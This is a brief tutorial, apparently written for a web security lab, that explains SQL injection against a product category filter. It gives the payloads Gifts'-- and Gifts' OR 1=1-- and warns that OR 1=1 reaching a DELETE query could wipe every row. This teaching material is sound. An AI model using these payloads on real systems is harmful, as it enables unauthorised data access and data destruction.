## The Simple Idea

The website hides unreleased products using `AND released = 1` in the SQL query.

Your job is to **remove** or **break** that restriction.

## How the Attack Works

### Method 1: Comment out the restriction

**Normal query:**
```sql
WHERE category = 'Gifts' AND released = 1
```

**You send:** `Gifts'--`

**Resulting query:**
```sql
WHERE category = 'Gifts'-- AND released = 1
```

The `--` tells SQL: "Ignore everything after this." So `AND released = 1` gets ignored.

**Outcome:** You see ALL gifts (released + unreleased).

### Method 2: Add an always-true condition

**You send:** `Gifts' OR 1=1--`

**Resulting query:**
```sql
WHERE category = 'Gifts' OR 1=1-- AND released = 1
```

Since `1=1` is always true, every product matches. The `AND released = 1` is commented out.

**Outcome:** You see EVERY product (all categories, all releases).

## The Warning (Very Important)

If the same input also gets used in an `UPDATE` or `DELETE` query elsewhere in the application, your `OR 1=1` could modify or delete **all rows** instead of just one.

**Example disaster:**
```sql
DELETE FROM users WHERE id = '5 OR 1=1'
```
This deletes **every user**, not just user 5.

## One Sentence Summary

You inject `--` to ignore the restriction, or `OR 1=1` to make the restriction meaningless.
